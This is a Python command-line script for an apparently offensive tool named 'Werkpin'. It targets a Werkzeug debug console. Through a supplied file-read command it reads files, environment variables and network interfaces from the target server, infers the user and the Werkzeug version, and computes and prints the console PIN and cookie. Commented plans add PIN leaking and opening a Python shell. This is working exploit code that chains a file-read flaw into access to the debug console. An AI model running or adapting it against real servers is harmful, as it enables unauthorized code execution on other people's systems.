#!/usr/bin/env python3
import logging
import argparse
from werkpin.filereader import FileReader, FileReaderError
from logging import getLogger
logging.basicConfig(level=logging.DEBUG)
logger = getLogger(__name__)

from werkpin.util import resolve_version
from .net import Net

VERSION = "0.9.0"

DEFAULT_MODNAME = "flask.app"

DEFAULT_APPNAME = "Flask"
DEFAULT_PATH = "/usr/lib/python3/dist-packages/flask/app.py"

DEFAULT_INTERFACE = "eth0"

def get_args():
    parser = argparse.ArgumentParser(description='Werkpin')
    parser.add_argument('-V', '--version', action='version', version=f'%(prog)s {VERSION}')
    verbosity_group = parser.add_mutually_exclusive_group()
    verbosity_group.add_argument('-q', '--quiet', action='store_true', help='Quiet mode')
    verbosity_group.add_argument('-v', '--verbose', action='store_true', help='Verbose mode')

    # subgroup: leak, authenticate, and shell
    # group = parser.add_mutually_exclusive_group() # TODO
    # group.add_argument('--leak', help='Leak console pin') # TODO
    # group.add_argument('--authenticate', help='Open authenticated browser window') # TODO
    # group.add_argument('--shell', help='Open python shell') # TODO

    parser.add_argument('-fr', '--file-reader', help="Executable command to read file", required=True)

    # Add subgroup, assisting all commands and Werkzeug console pin caluclation  
    parser.add_argument('-u', '--url', help='URL to target, that ends in /console', required=True)
    parser.add_argument('-U', '--username', help='Username that allegedly runs the application. None implies inference from environ.')
    parser.add_argument('-M', '--modname', help='Module name that allegedly runs the application',
                        default=DEFAULT_MODNAME)
    # TODO: Appfile can be checked with FileReader, searching through appfile
    parser.add_argument('-A', '--appname', help='Application name that allegedly runs the application',
                        default=DEFAULT_APPNAME)
    parser.add_argument('-F', '--appfile', help='Application file that allegedly runs the application',
                        default=DEFAULT_PATH)
    parser.add_argument('-I', '--running-interface', help='Interface that the application is running on',
                        default=DEFAULT_INTERFACE, dest="iface")
    parser.add_argument('-wv', '--werkzeug-version', help='Werkzeug version. None implies inference from headers.',
                        default=None)

    return parser.parse_args()


def main():
    args = get_args()
    try:
        net = Net(args.url)
    except Exception as e:
        raise Exception(f"Error connecting to {args.url}.")
    
    # Figure out version
    if args.werkzeug_version is None:
        args.werkzeug_version = net.header_version
    if args.werkzeug_version is None:
        raise Exception("Werkzeug version not specified and cannot be inferred from headers")
    logger.info(f"Detected Werkzeug version: {args.werkzeug_version}")

    # Check filereader
    file_reader = FileReader(args.file_reader, check_file='/etc/hosts')

    # Check user
    if args.username is None:
        logger.info("Username not specified, trying to infer from environ")
        args.username = file_reader.env.get("USER")
        logger.info(f"Inferred username: {args.username}")
    if args.username is None:
        raise Exception("Username not specified and cannot be inferred from environ")

    # Check interface
    if args.iface not in file_reader.list_interfaces:
        raise Exception(f"Interface {args.iface} not found in {file_reader.list_interfaces}")

    try:
        logger.info("Checking if appfile exists.")
        file_reader.read(args.appfile)
        logger.info("Appfile exists.")
    except FileReaderError:
        raise Exception(f"File {args.appfile} not found") 
    
    # Resolve version
    pin_generator_class, matched_version = resolve_version(args.werkzeug_version)
    pin_generator = pin_generator_class(file_reader, matched_version)

    pin, cookie = pin_generator.get_pin_and_cookie_name(
        args.username,
        args.modname,
        args.appname,
        args.appfile,
        args.iface
    )

    logger.info(f"Pin:      {pin}")
    logger.info(f"Cookie:   {cookie}")

if __name__ == "__main__":
    main()